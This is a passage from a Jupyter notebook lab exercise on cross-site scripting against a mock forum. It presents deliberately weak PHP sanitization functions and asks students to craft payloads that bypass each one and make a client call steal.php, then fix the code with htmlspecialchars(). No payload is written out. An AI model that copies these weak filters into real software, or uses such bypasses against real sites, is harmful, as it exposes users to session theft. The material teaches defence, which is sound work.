    "### Step 7: Testing Your Exploit\n",
    "\n",
    "Navigate to ```localhost:port/index.php``` to access Sloth's Unlimited. Once again, <strong>port forwarding is required</strong> in order to access the website from your browser. ```port``` is a value that you chose in your SSH statement.\n",
    "\n",
    "Currently, there is not a sanitization function applied to the website, making the entire forum prone to cross-site scripting. When a message gets created, this is what the message gets called through:\n",
    "\n",
    "```\n",
    "function sanitize($string) {\n",
    "  return $string;\n",
    "}\n",
    "```\n",
    "\n",
    "Type a payload into the website that causes ```client``` to access ```steal.php``` using the call example that was provided above. After you have a working payload, you should see the ```Eagles``` category appear on the home page of Sloth's Unlimited. \n",
    "\n",
    "Take your payload and write it to a text file as  ```/lab/payload1.txt```, then click the button below to check your work."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Step 8: Breaking The First Sanitization Function\n",
    "\n",
    "The developers of Sloth's Unlimited have decided to use a sanitization function for all posts that are made to their message board. This is the sanitization function that they have decided to use:\n",
    "\n",
    "```\n",
    "function sanitize($string) {\n",
    "  return preg_replace(\"/<\\/?script[^>]*>/\", \"\", $string);\n",
    "}\n",
    "```\n",
    "\n",
    "This function will take any occurrence of ```<script>```, then replace it with an empty string.\n",
    "\n",
    "Adjust your payload so that it will break this sanitization function. Write it to a text file as ```/lab/payload2.txt```, then click the button below to check your work."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Step 9: Breaking The Second Sanitization Function\n",
    "\n",
    "The developers of Sloth's Unlimited created a better sanitization function, in hopes to fix their security. This is the new function that they have written:\n",
    "\n",
    "```\n",
    "function sanitize($string) {\n",
    "  $new = $string;\n",
    "  do {\n",
    "    $string = $new;\n",
    "    $new = preg_replace(\"/<\\/?script[^>]*>/\", \"\", $string);\n",
    "  } while (strcmp($string, $new) != 0);\n",
    "  return $new;\n",
    "}\n",
    "```\n",
    "\n",
    "This function will take all occurrences of ```<script>``` and replace them with an empty string.\n",
    "\n",
    "Adjust your payload so that it will break this sanitization function. Write it to a text file as ```/lab/payload3.txt```, then click the button below to check your work."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Step 10: Breaking The Third Sanitization Function (OPTIONAL)\n",
    "\n",
    "Finally, the developers have decided to use one more sanitization function in hopes to prevent all vulnerabilities involving the ```<script>``` tag. This is what they are going to use:\n",
    "\n",
    "```\n",
    "function sanitize($string) {\n",
    "  $new = $string;\n",
    "  do {\n",
    "    $string = $new;\n",
    "    $new = preg_replace(\"/<[^>]+?>/\", \"\", $string);\n",
    "  } while (strcmp($string, $new) != 0);\n",
    "  return $new;\n",
    "}\n",
    "```\n",
    "\n",
    "Since this is an optional step, you are encouraged to think about what this function does, and how it can be broken.\n",
    "\n",
    "Adjust your payload so that it will break this sanitization function. Write it to a text file as ```/lab/payload4.txt```, then click the button below to check your work."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Step 11: Using PHP's Built-In ```htmlspecialchars()``` Function\n",
    "\n",
    "From the previous few steps, you should be able to observe that creating an effective sanitization function is difficult, and should be avoided. Fortunately, PHP contains a built-in function that is used for escaping dangerous characters, named ```htmlspecialchars()```. This function takes a string for an input, and replaces all unsafe characters with escape characters to prevent cross-site scripting attacks. \n",
    "\n",
    "You may read the ```htmlspecialchars()``` documentation <a href=\"https://www.php.net/manual/en/function.htmlspecialchars.php\">here</a>.\n",
    "\n",
    "Create a copy of ```sanitize.php``` called ```sanitize.php.patch```. Make your changes to ```sanitize.php.patch```. Click the button below to save your work."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Step 12: Writing Memos\n",
    "\n",
    "Inside of ```/lab```, create two files named ```attack-memo.txt``` and ```fix-memo.txt```.\n",
    "\n",
    "<strong>```attack-memo.txt```</strong>: Suppose that you are King Teshwan, the hacker for this website. Write a memo to Lord Dingwall, the owner of this website, explaining the attack that you made, describing how you broke each of the sanitization functions.\n",
    "\n",
    "<strong>```fix-memo.txt```</strong>: Suppose that you are Lord Dingwall, the owner of this website. Write a memo to King Teshwan, the hacker for the website, explaining how you fixed the attacks that were made against the website.\n",
    "\n",
    "For each of these memos, write no less than one paragraph. Include a proper opening and closure.\n",
    "\n",
    "Click the button below to save your work."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.12"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
